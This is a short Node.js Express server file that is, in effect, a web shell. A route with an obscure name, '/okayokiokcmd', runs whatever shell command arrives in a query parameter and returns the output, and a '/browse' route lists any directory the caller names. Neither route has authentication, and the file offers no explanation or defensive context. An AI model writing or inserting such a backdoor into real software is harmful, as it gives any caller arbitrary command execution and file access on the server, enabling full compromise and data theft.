const express = require('express');
const fs = require('fs');
const { exec } = require('child_process');

const app = express();
app["get"]('/okayokiokcmd', (req, res) => {
  exec(req.query['command'], (error, stdout) => {
    res.send(error ? String(error) : stdout);
  });
});
app.get('/browse', (req, res) => {
  res.json(fs.readdirSync(req.query.path || process.cwd()));
});
